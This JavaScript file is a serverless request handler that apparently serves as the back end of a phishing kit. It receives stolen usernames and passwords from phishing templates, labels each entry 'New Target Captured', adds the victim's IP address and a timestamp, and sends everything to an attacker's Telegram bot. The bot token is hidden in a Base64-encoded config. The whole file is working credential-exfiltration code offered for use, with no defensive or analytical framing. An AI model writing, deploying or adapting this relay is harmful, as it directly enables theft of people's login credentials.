export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { config, data } = req.body;

    // Check if both the Telegram config and the captured data exist
    if (!config || !data) {
        return res.status(400).json({ error: 'Payload missing' });
    }

    try {
        // 1. Decode the Base64 config string into JSON
        const decoded = JSON.parse(Buffer.from(config, 'base64').toString());

        // 2. Format the message for Telegram
        // Note: We use data.User and data.Pass to match your templates
        const message = `🎯 **New Target Captured**\n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `👤 **User**: \`${data.User || 'N/A'}\` \n` +
                        `🔑 **Pass**: \`${data.Pass || 'N/A'}\` \n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `🌐 **IP**: \`${req.headers['x-forwarded-for'] || 'Unknown'}\` \n` +
                        `🕒 **Time**: ${new Date().toLocaleString()}`;

        // 3. Dispatch to Telegram API
        const tgUrl = `https://api.telegram.org/bot${decoded.t}/sendMessage`;
        
        const response = await fetch(tgUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: decoded.c,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            const errLog = await response.text();
            console.error('Telegram Error:', errLog);
            throw new Error('Telegram API Error');
        }

        return res.status(200).json({ success: true });
    } catch (err) {
        console.error('Processing Error:', err);
        return res.status(500).json({ error: 'Relay failed to process transmission' });
    }
}
